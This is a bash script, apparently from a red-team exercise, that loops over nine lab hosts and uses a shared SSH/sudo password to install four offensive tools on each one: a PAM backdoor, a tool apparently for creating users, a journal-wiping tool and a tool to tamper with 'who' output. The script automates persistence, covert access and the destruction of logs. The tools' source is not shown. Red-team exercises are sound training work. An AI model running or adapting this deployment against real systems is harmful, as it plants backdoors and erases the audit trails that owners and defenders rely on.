#!/usr/bin/env bash
# deploy-quick3.sh — deploy infinite-users + nuke-journal + pam-backdoor to a target
#
# Usage:
#   ./deploy-quick3.sh <host> [-P port]

set -uo pipefail

RT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
RT_SSH="${RT_DIR}/rt-ssh.sh"

GREEN='\033[0;32m'; RED='\033[0;31m'; CYAN='\033[0;36m'
BOLD='\033[1m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
err()  { echo -e "${RED}[!]${NC} $*" >&2; }
hdr()  { echo -e "\n${CYAN}${BOLD}━━  $*  ━━${NC}\n"; }

HOSTS=(
    10.10.10.105   # svc-samba-01
    10.10.10.103   # svc-database-01
    10.10.10.102   # svc-redis-01
    10.10.10.104   # svc-amazin-01
    10.10.10.101   # svc-ftp-01
    10.10.10.106   # blue-ubnt-01
    10.10.10.107   # blue-ubnt-02
    10.10.10.108   # blue-ubnt-03
    10.10.10.109   # blue-ubnt-04
)

TOOLS=(infinite-users nuke-journal pam-backdoor compromise-who)

# prompt once
read -rsp $'\033[0;36m[?]\033[0m SSH/sudo password for mbrown: ' SSH_PASS
echo
export RT_SSH_PASS="$SSH_PASS"
export RT_SUDO_PASS="$SSH_PASS"

TOTAL_PASS=0; TOTAL_FAIL=0

for ip in "${HOSTS[@]}"; do
    TARGET="mbrown@${ip}"
    hdr "Deploying to ${TARGET}"

    for tool in "${TOOLS[@]}"; do
        info "${tool}..."
        if "$RT_SSH" -t "$TARGET" "$tool" install; then
            info "${tool}: OK"
            (( TOTAL_PASS++ )) || true
        else
            err "${tool}: FAILED"
            (( TOTAL_FAIL++ )) || true
        fi
    done
done

hdr "Done — ${#HOSTS[@]} hosts"
info "${TOTAL_PASS} passed, ${TOTAL_FAIL} failed"
[[ $TOTAL_FAIL -gt 0 ]] && exit 1 || exit 0
